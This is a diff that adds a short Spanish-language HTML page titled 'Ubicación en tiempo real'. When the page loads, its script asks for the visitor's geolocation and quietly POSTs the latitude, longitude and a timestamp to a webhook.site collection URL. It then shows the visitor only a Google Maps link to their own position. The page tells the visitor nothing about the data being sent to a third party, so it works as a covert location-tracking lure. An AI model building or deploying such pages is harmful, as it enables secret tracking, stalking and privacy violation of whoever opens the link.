@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Ubicación en tiempo real</title>
+  </head>
+  <body>
+    <h2>Obteniendo ubicación...</h2>
+    <div id="mapa"></div>
+    <script>
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const timestamp = new Date().toISOString();
+
+        fetch("https://webhook.site/915e41d8-58d5-4acc-9e0d-efeaa929b016", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ latitud: lat, longitud: lon, timestamp })
+        });
+
+        const enlace = document.createElement("a");
+        enlace.href = `https://www.google.com/maps?q=${lat},${lon}`;
+        enlace.target = "_blank";
+        enlace.textContent = "📍 Ver ubicación en Google Maps";
+        document.body.appendChild(enlace);
+      });
+    </script>
+  </body>
+</html>
